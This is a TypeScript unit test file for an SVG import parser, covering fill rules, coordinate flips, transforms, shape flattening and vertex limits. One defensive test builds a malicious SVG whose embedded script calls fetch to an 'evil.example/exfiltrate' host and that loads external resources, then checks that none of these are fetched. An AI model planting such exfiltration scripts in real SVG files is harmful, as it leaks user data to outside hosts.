import { afterEach, describe, expect, it, vi } from 'vitest'
import { boundsOf, signedArea } from '../geometry/normalize'
import type { Contour } from '../geometry/types'
import { MAX_SVG_VERTICES, getLastSvgImportReport, svgToContours } from './svg'

/**
 * SVG インポートのユニットテスト（Task 6.2 / FR-003 / FR-005 / US-002 / NFR-030）。
 *
 * svg.ts は DOM を使わない純文字列パーサなので、Node 上でブラウザと同一の
 * コードパスがそのまま走る（差し替えシームなし）。外部送信ゼロ（NFR-030）の
 * 回帰テストは、Node に存在しうる取得手段（fetch）と、ブラウザなら取得を
 * 引き起こす API（XMLHttpRequest / Image / DOMParser）をすべてスパイとして
 * 植え付け、悪意ある SVG の処理中に**一度も呼ばれない**ことで検証する。
 */

const svg = (inner: string): string => `<svg xmlns="http://www.w3.org/2000/svg">${inner}</svg>`

const holesOf = (contours: Contour[]): Contour[] => contours.filter((c) => c.isHole)
const outersOf = (contours: Contour[]): Contour[] => contours.filter((c) => !c.isHole)

/** 輪郭集合の総頂点数 */
const vertexCount = (contours: Contour[]): number =>
  contours.reduce((sum, c) => sum + c.points.length / 2, 0)

/** ドーナツ（外周 10×10・内周 2..8）。外側と内側は逆巻き — nonzero でも穴になる */
const DONUT_D = 'M0 0 H10 V10 H0 Z M2 2 V8 H8 V2 Z'

/** 同方向の入れ子正方形。nonzero では中身の詰まった正方形、evenodd ではドーナツ */
const SAME_DIRECTION_NESTED_D = 'M0 0 H10 V10 H0 Z M2 2 H8 V8 H2 Z'

afterEach(() => {
  vi.unstubAllGlobals()
})

describe('sources/svg (Task 6.2)', () => {
  // -------------------------------------------------------------------------
  // 複合サブパスの入れ子・fill-rule（FR-005）
  // -------------------------------------------------------------------------

  it('donut path (opposite windings, default nonzero) keeps its hole', async () => {
    const contours = await svgToContours(svg(`<path d="${DONUT_D}"/>`), 'donut.svg')
    expect(contours).toHaveLength(2)
    const holes = holesOf(contours)
    expect(holes).toHaveLength(1)
    const holeBounds = boundsOf(holes)
    const outerBounds = boundsOf(outersOf(contours))
    expect(holeBounds.minX).toBeGreaterThan(outerBounds.minX)
    expect(holeBounds.maxX).toBeLessThan(outerBounds.maxX)
    expect(holeBounds.minY).toBeGreaterThan(outerBounds.minY)
    expect(holeBounds.maxY).toBeLessThan(outerBounds.maxY)
  })

  it('nonzero vs evenodd genuinely differ on same-direction nested subpaths', async () => {
    // 同方向の入れ子は 2 つの規則の解釈が分かれる図形：
    // - nonzero: 内側の巻き数は 2（0 にならない）→ 塗りは途切れず、内側の
    //   リングは塗りの境界ですらない → 輪郭 1 個・穴なし
    // - evenodd: 交差数の偶奇が反転する → 内側は塗り抜き → 穴 1 個
    // 逆巻きのドーナツ（上のテスト）では両規則が同じ結果になるため、
    // この図形でなければ fill-rule の実装は検証できない
    const nonzero = await svgToContours(
      svg(`<path fill-rule="nonzero" d="${SAME_DIRECTION_NESTED_D}"/>`),
      'nz.svg',
    )
    expect(nonzero).toHaveLength(1)
    expect(holesOf(nonzero)).toHaveLength(0)

    const evenodd = await svgToContours(
      svg(`<path fill-rule="evenodd" d="${SAME_DIRECTION_NESTED_D}"/>`),
      'eo.svg',
    )
    expect(evenodd).toHaveLength(2)
    expect(holesOf(evenodd)).toHaveLength(1)
  })

  it('fill-rule defaults to nonzero when unspecified', async () => {
    const contours = await svgToContours(svg(`<path d="${SAME_DIRECTION_NESTED_D}"/>`), 'd.svg')
    expect(contours).toHaveLength(1)
    expect(holesOf(contours)).toHaveLength(0)
  })

  it('fill-rule from a <style> CSS rule is applied (FR-005: CSS 側)', async () => {
    const contours = await svgToContours(
      svg(
        `<style>.eo { fill-rule: evenodd; }</style><path class="eo" d="${SAME_DIRECTION_NESTED_D}"/>`,
      ),
      'css.svg',
    )
    expect(holesOf(contours)).toHaveLength(1)
  })

  it('CSS rule overrides the presentation attribute (cascade order)', async () => {
    const contours = await svgToContours(
      svg(
        `<style>.eo { fill-rule: evenodd; }</style>` +
          `<path class="eo" fill-rule="nonzero" d="${SAME_DIRECTION_NESTED_D}"/>`,
      ),
      'cascade.svg',
    )
    expect(holesOf(contours)).toHaveLength(1)
  })

  it('inline style has the highest priority', async () => {
    const contours = await svgToContours(
      svg(
        `<style>path { fill-rule: nonzero; }</style>` +
          `<path style="fill-rule: evenodd" d="${SAME_DIRECTION_NESTED_D}"/>`,
      ),
      'inline.svg',
    )
    expect(holesOf(contours)).toHaveLength(1)
  })

  it('fill-rule inherits through <g>', async () => {
    const contours = await svgToContours(
      svg(`<g fill-rule="evenodd"><path d="${SAME_DIRECTION_NESTED_D}"/></g>`),
      'inherit.svg',
    )
    expect(holesOf(contours)).toHaveLength(1)
  })

  // -------------------------------------------------------------------------
  // Y 下向き → Y 上向き変換と巻き方向の再判定（FR-003）
  // -------------------------------------------------------------------------

  it('Y-down input comes out Y-up: the topmost SVG point gets the largest Y', async () => {
    // SVG 座標で頂点 (0, 0) が最上部（Y 下向きなので y 最小 = 画面上端）。
    // Y 上向き変換後はその点が最大の y を持つはず
    const contours = await svgToContours(
      svg('<polygon points="0,0 10,20 -10,20"/>'),
      'triangle.svg',
    )
    expect(contours).toHaveLength(1)
    const pts = contours[0].points
    let apexY: number | null = null
    let maxY = -Infinity
    for (let i = 0; i < pts.length; i += 2) {
      if (pts[i + 1] > maxY) maxY = pts[i + 1]
      if (pts[i] === 0) apexY = pts[i + 1]
    }
    expect(apexY).not.toBeNull()
    // flipY は y = 0 を −0 にする（数値として等価）ため Object.is 比較は使わない
    expect(apexY).toBeCloseTo(maxY, 12)
    const bounds = boundsOf(contours)
    expect(bounds.maxY).toBeCloseTo(0, 12)
    expect(bounds.minY).toBeCloseTo(-20, 12)
  })

  it('holes stay holes across the Y flip, wound per convention (outer CCW / hole CW)', async () => {
    const contours = await svgToContours(svg(`<path d="${DONUT_D}"/>`), 'donut.svg')
    for (const contour of contours) {
      const area = signedArea(contour.points)
      if (contour.isHole) expect(area).toBeLessThan(0)
      else expect(area).toBeGreaterThan(0)
    }
  })

  it('a Y-mirroring transform (scale(1,-1)) still classifies the hole correctly', async () => {
    // 負の行列式の transform は全リングの巻きを反転させる。分類は変換後の
    // 幾何で行われるため、穴は穴のまま出てくるはず
    const contours = await svgToContours(
      svg(`<g transform="scale(1,-1)"><path d="${DONUT_D}"/></g>`),
      'mirrored.svg',
    )
    expect(holesOf(contours)).toHaveLength(1)
  })

  // -------------------------------------------------------------------------
  // transform（FR-005: matrix / translate / scale / rotate）
  // -------------------------------------------------------------------------

  it('translate + scale compose left-to-right', async () => {
    const contours = await svgToContours(
      svg('<rect width="10" height="5" transform="translate(100,50) scale(2,3)"/>'),
      'ts.svg',
    )
    const bounds = boundsOf(contours)
    expect(bounds.minX).toBeCloseTo(100, 9)
    expect(bounds.maxX).toBeCloseTo(120, 9)
    // SVG 座標の y ∈ [50, 65] は Y 反転後 [−65, −50]
    expect(bounds.minY).toBeCloseTo(-65, 9)
    expect(bounds.maxY).toBeCloseTo(-50, 9)
  })

  it('rotate(90) maps the rect as the SVG spec defines', async () => {
    const contours = await svgToContours(
      svg('<rect width="10" height="5" transform="rotate(90)"/>'),
      'rot.svg',
    )
    const bounds = boundsOf(contours)
    expect(bounds.minX).toBeCloseTo(-5, 9)
    expect(bounds.maxX).toBeCloseTo(0, 9)
    expect(bounds.minY).toBeCloseTo(-10, 9)
    expect(bounds.maxY).toBeCloseTo(0, 9)
  })

  it('matrix() and nested <g> transforms compose', async () => {
    const contours = await svgToContours(
      svg(
        '<g transform="translate(10,0)"><g transform="matrix(2 0 0 2 0 0)">' +
          '<rect width="3" height="3"/></g></g>',
      ),
      'nested.svg',
    )
    const bounds = boundsOf(contours)
    expect(bounds.minX).toBeCloseTo(10, 9)
    expect(bounds.maxX).toBeCloseTo(16, 9)
    expect(bounds.minY).toBeCloseTo(-6, 9)
    expect(bounds.maxY).toBeCloseTo(0, 9)
  })

  // -------------------------------------------------------------------------
  // 基本図形と path 文法
  // -------------------------------------------------------------------------

  it('circle / ellipse are polygonized with bounded chord error', async () => {
    const circle = await svgToContours(svg('<circle r="5"/>'), 'circle.svg')
    expect(circle).toHaveLength(1)
    const cb = boundsOf(circle)
    expect(cb.minX).toBeCloseTo(-5, 1)
    expect(cb.maxX).toBeCloseTo(5, 1)
    expect(Math.abs(signedArea(circle[0].points))).toBeGreaterThan(Math.PI * 25 * 0.99)

    const ellipse = await svgToContours(svg('<ellipse rx="4" ry="2"/>'), 'ellipse.svg')
    const eb = boundsOf(ellipse)
    expect(eb.maxX - eb.minX).toBeCloseTo(8, 1)
    expect(eb.maxY - eb.minY).toBeCloseTo(4, 1)
  })

  it('rounded rect (rx/ry) is supported and loses the corner area', async () => {
    const contours = await svgToContours(
      svg('<rect width="10" height="6" rx="2"/>'),
      'rrect.svg',
    )
    const bounds = boundsOf(contours)
    expect(bounds.maxX - bounds.minX).toBeCloseTo(10, 6)
    expect(bounds.maxY - bounds.minY).toBeCloseTo(6, 6)
    // 面積 = wh − (4 − π)·rx·ry
    const expected = 10 * 6 - (4 - Math.PI) * 2 * 2
    expect(Math.abs(signedArea(contours[0].points))).toBeCloseTo(expected, 0)
  })

  it('arc (A) commands close into a circle-like ring', async () => {
    const contours = await svgToContours(
      svg('<path d="M -5 0 A 5 5 0 1 0 5 0 A 5 5 0 1 0 -5 0 Z"/>'),
      'arc.svg',
    )
    expect(contours).toHaveLength(1)
    const area = Math.abs(signedArea(contours[0].points))
    expect(Math.abs(area - Math.PI * 25) / (Math.PI * 25)).toBeLessThan(0.02)
  })

  it('relative commands (m/l/h/v/z) parse like their absolute forms', async () => {
    const contours = await svgToContours(
      svg('<path d="m1 2 h10 v5 h-10 z"/>'),
      'rel.svg',
    )
    const bounds = boundsOf(contours)
    expect(bounds.minX).toBeCloseTo(1, 9)
    expect(bounds.maxX).toBeCloseTo(11, 9)
    expect(bounds.minY).toBeCloseTo(-7, 9)
    expect(bounds.maxY).toBeCloseTo(-2, 9)
  })

  it('cubic/quadratic curves are flattened within tolerance', async () => {
    // 半径 5 の円を 4 本の 3 次ベジェで近似する定番の形（k ≈ 0.5523）
    const k = 5 * 0.5522847498
    const d =
      `M 5 0 C 5 ${k} ${k} 5 0 5 S -5 ${k} -5 0 ` +
      `C -5 ${-k} ${-k} -5 0 -5 S 5 ${-k} 5 0 Z`
    const contours = await svgToContours(svg(`<path d="${d}"/>`), 'bezier.svg')
    expect(contours).toHaveLength(1)
    expect(contours[0].points.length / 2).toBeGreaterThan(16)
    const area = Math.abs(signedArea(contours[0].points))
    expect(Math.abs(area - Math.PI * 25) / (Math.PI * 25)).toBeLessThan(0.02)
  })

  // -------------------------------------------------------------------------
  // fill="none"・ストロークのみ・開いたパスの無視（FR-005）
  // -------------------------------------------------------------------------

  it('fill="none" and stroke-only shapes are ignored', async () => {
    const contours = await svgToContours(
      svg(
        '<rect fill="none" width="100" height="100"/>' +
          '<line x1="0" y1="0" x2="10" y2="10" stroke="black"/>' +
          '<polyline points="0,0 5,5 10,0" stroke="black" fill="none"/>' +
          '<path d="M0 0 L10 10" stroke="black"/>' +
          '<circle r="5"/>',
      ),
      'mixed.svg',
    )
    // 採用されるのは円 1 個だけ
    expect(contours).toHaveLength(1)
    const bounds = boundsOf(contours)
    expect(bounds.maxX).toBeCloseTo(5, 1)
  })

  it('fill inherits: a group of fill="none" is ignored unless a child overrides', async () => {
    await expect(
      svgToContours(svg('<g fill="none"><rect width="10" height="10"/></g>'), 'none.svg'),
    ).rejects.toThrow(/閉じた塗りつぶし対象のパスがありません/)

    const overridden = await svgToContours(
      svg('<g fill="none"><rect fill="black" width="10" height="10"/></g>'),
      'override.svg',
    )
    expect(overridden).toHaveLength(1)
  })

  // -------------------------------------------------------------------------
  // 拒否（US-002: 閉じたパスなし・非 SVG）
  // -------------------------------------------------------------------------

  it('an SVG with no closed fillable path is rejected with the file name and reason', async () => {
    await expect(
      svgToContours(svg('<path d="M0 0 L10 10" stroke="black"/>'), 'strokes-only.svg'),
    ).rejects.toThrow(/「strokes-only\.svg」には閉じた塗りつぶし対象のパスがありません/)
    await expect(svgToContours(svg(''), 'empty.svg')).rejects.toThrow(/閉じた塗りつぶし対象/)
  })

  it('non-XML and non-SVG input is rejected with a reason', async () => {
    await expect(svgToContours('this is not xml', 'junk.svg')).rejects.toThrow(
      /SVG として解釈できません/,
    )
    await expect(svgToContours('<html><body/></html>', 'page.svg')).rejects.toThrow(
      /ルート要素が <svg> ではありません/,
    )
    await expect(svgToContours('<svg><rect width="3"', 'trunc.svg')).rejects.toThrow(
      /SVG として解釈できません/,
    )
  })

  // -------------------------------------------------------------------------
  // 外部参照の遮断（FR-005 / NFR-030）— このタスクの安全性の核心
  // -------------------------------------------------------------------------

  it('external references are discarded with ZERO network activity (NFR-030 regression)', async () => {
    // 取得を引き起こしうる API を全てスパイに差し替える。svg.ts は DOM を
    // 使わない純文字列パーサなので、これらが呼ばれる経路は存在しないはず —
    // このテストは将来 DOM パースや fetch を持ち込む変更への回帰ガード
    const fetchSpy = vi.fn(() => Promise.reject(new Error('network must not be touched')))
    const xhrSpy = vi.fn()
    const imageSpy = vi.fn()
    const domParserSpy = vi.fn()
    vi.stubGlobal('fetch', fetchSpy)
    vi.stubGlobal('XMLHttpRequest', xhrSpy)
    vi.stubGlobal('Image', imageSpy)
    vi.stubGlobal('DOMParser', domParserSpy)

    const malicious =
      '<?xml version="1.0"?>' +
      '<!DOCTYPE svg SYSTEM "https://evil.example/svg.dtd">' +
      svg(
        '<script>fetch("https://evil.example/exfiltrate")</script>' +
          '<image href="https://example.com/x.png" width="10" height="10"/>' +
          '<use xlink:href="https://example.com/defs.svg#icon"/>' +
          '<style>@import url("https://fonts.example.com/css?family=X");' +
          '@font-face { font-family: X; src: url("https://fonts.example.com/x.woff2"); }</style>' +
          '<foreignObject><div>html</div></foreignObject>' +
          '<rect width="10" height="10"/>',
      )

    const contours = await svgToContours(malicious, 'malicious.svg')

    // 幾何としては正当な rect だけが採用される
    expect(contours).toHaveLength(1)
    expect(boundsOf(contours).maxX).toBeCloseTo(10, 9)

    // ネットワークに触れうるものは一切呼ばれていない
    expect(fetchSpy).not.toHaveBeenCalled()
    expect(xhrSpy).not.toHaveBeenCalled()
    expect(imageSpy).not.toHaveBeenCalled()
    expect(domParserSpy).not.toHaveBeenCalled()

    // 破棄はレポートに現れる（黙殺しない）
    const report = getLastSvgImportReport()
    expect(report).not.toBeNull()
    const notes = (report as NonNullable<typeof report>).ignored.join('\n')
    expect(notes).toMatch(/<script>/)
    expect(notes).toMatch(/<image>/)
    expect(notes).toMatch(/<use>/)
    expect(notes).toMatch(/@import/)
  })

  it('clipPath / mask / filter are ignored with a note (FR-005)', async () => {
    const contours = await svgToContours(
      svg(
        '<clipPath id="c"><rect width="5" height="5"/></clipPath>' +
          '<rect clip-path="url(#c)" width="10" height="10"/>',
      ),
      'clip.svg',
    )
    // クリップは適用されない：rect は 10×10 のまま
    expect(boundsOf(contours).maxX).toBeCloseTo(10, 9)
    const report = getLastSvgImportReport()
    expect((report as NonNullable<typeof report>).ignored.join('\n')).toMatch(/適用されません/)
  })

  // -------------------------------------------------------------------------
  // 頂点数上限と単純化（US-002 / FR-005: 10,000 → SIMPLIFIED）
  // -------------------------------------------------------------------------

  it('over-budget input is simplified below 10,000 vertices and reported (SIMPLIFIED)', async () => {
    // 8,000 頂点の外円 + 4,000 頂点の逆巻き内円（計 12,000 > 10,000）のドーナツ
    const ringD = (r: number, n: number, ccw: boolean): string => {
      const parts: string[] = []
      for (let i = 0; i < n; i++) {
        const t = ((ccw ? 1 : -1) * 2 * Math.PI * i) / n
        parts.push(`${i === 0 ? 'M' : 'L'} ${(r * Math.cos(t)).toFixed(6)} ${(r * Math.sin(t)).toFixed(6)}`)
      }
      return `${parts.join(' ')} Z`
    }
    const d = `${ringD(10, 8000, true)} ${ringD(4, 4000, false)}`
    const contours = await svgToContours(svg(`<path d="${d}"/>`), 'huge.svg')

    expect(vertexCount(contours)).toBeLessThanOrEqual(MAX_SVG_VERTICES)
    // 穴は単純化を生き延びる
    expect(holesOf(contours)).toHaveLength(1)
    // 面積はほぼ保存される（単純化が形を壊していない）
    const outerArea = Math.abs(signedArea(outersOf(contours)[0].points))
    expect(Math.abs(outerArea - Math.PI * 100) / (Math.PI * 100)).toBeLessThan(0.01)

    const report = getLastSvgImportReport()
    expect(report).not.toBeNull()
    const simplified = (report as NonNullable<typeof report>).simplified
    expect(simplified).not.toBeNull()
    expect((simplified as NonNullable<typeof simplified>).before).toBe(12000)
    expect((simplified as NonNullable<typeof simplified>).after).toBeLessThanOrEqual(
      MAX_SVG_VERTICES,
    )
  })

  it('within-budget input is not simplified (report stays null)', async () => {
    await svgToContours(svg('<circle r="5"/>'), 'small.svg')
    const report = getLastSvgImportReport()
    expect((report as NonNullable<typeof report>).simplified).toBeNull()
  })

  // -------------------------------------------------------------------------
  // 複数要素の合成
  // -------------------------------------------------------------------------

  it('multiple elements each contribute their own contours', async () => {
    const contours = await svgToContours(
      svg('<rect width="4" height="4"/><circle cx="20" r="3"/>'),
      'two.svg',
    )
    expect(contours).toHaveLength(2)
    expect(holesOf(contours)).toHaveLength(0)
  })
})
